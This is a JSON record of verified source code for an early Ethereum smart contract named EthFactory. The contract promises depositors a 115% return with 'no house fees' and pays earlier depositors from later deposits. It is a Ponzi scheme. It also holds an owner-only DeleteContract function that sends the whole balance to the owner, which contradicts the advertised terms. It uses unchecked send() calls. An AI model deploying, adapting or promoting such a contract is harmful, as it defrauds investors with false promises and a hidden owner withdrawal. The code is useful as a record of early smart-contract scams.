{"SourceCode":"///[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]Welcome to EthFactory!\r\n//\r\n// Multiply your Ether by +15% !!\r\n//\r\n// NO MINIMUM DEPOSIT !!\r\n//\r\n// NO HOUSE FEES !!\r\n//\r\n// Everyone gets paid in the line! After somebody has been paid, he is removed and the next person is in line for payment !\r\n//\r\n// Invest now, and you will Earn back 115%, which is your [Invested Ether] + [15% Profit] !\r\n//\r\n// Multiply your ETH Now !\r\n//\r\n///[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]Start\r\n\r\ncontract EthFactory{\r\n\r\n  struct InvestorArray { address EtherAddress; uint Amount; }\r\n  InvestorArray[] public depositors;\r\n\r\n///[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]Variables\r\n\r\n  uint public Total_Investors=0;\r\n  uint public Balance = 0;\r\n  uint public Total_Deposited=0;\r\n  uint public Total_Paid_Out=0;\r\n  string public Message=\"Welcome Investor! Multiply your ETH Now!\";\r\n  address public owner;\r\n  modifier manager { if (msg.sender == owner) _ }\r\n  function EthFactory() {owner = msg.sender;}\r\n  function() { enter(); }\r\n  \r\n///[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]Enter\r\n\r\n  function enter() {\r\n    if (msg.value > 0) {\r\n\r\n    uint Amount=msg.value;\t\t\t\t\t\t\t\t//set amount to how much the investor deposited\r\n    Total_Investors=depositors.length+1;   \t\t\t\t\t //count investors\r\n    depositors.length += 1;                        \t\t\t\t\t\t//increase array lenght\r\n    depositors[depositors.length-1].EtherAddress = msg.sender; //add net investor's address\r\n    depositors[depositors.length-1].Amount = Amount;          //add net investor's amount\r\n    Balance += Amount;               \t\t\t\t\t\t// balance update\r\n    Total_Deposited+=Amount;       \t\t\t\t\t\t//update deposited Amount\r\n    uint payment; uint index=0;\r\n\r\n    while (Balance > (depositors[index].Amount * 115/100) && index<Total_Investors)\r\n     {\r\n\tif(depositors[index].Amount!=0 )\r\n\t{\r\n      payment = depositors[index].Amount *115/100;                           //calculate pay out\r\n      depositors[index].EtherAddress.send(payment);                        //send pay out to investor\r\n      Balance -= depositors[index].Amount *115/100;                         //balance update\r\n      Total_Paid_Out += depositors[index].Amount *115/100;           //update paid out amount   \r\n       depositors[index].Amount=0;                                    //remove investor from the game after he is paid out! He must invest again if he wants to earn more!\r\n\t}break;\r\n      }\r\n  }\r\n}\r\nfunction DeleteContract() manager { owner.send(Balance); Balance=0; }\r\n\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"Balance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Message\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Total_Deposited\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Total_Paid_Out\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Total_Investors\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"depositors\",\"outputs\":[{\"name\":\"EtherAddress\",\"type\":\"address\"},{\"name\":\"Amount\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"DeleteContract\",\"outputs\":[],\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"enter\",\"outputs\":[],\"type\":\"function\"},{\"inputs\":[],\"type\":\"constructor\"}]","ContractName":"EthFactory","CompilerVersion":"v0.2.2-2016-03-10-34d714f","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","LicenseType":"","SwarmSource":""}
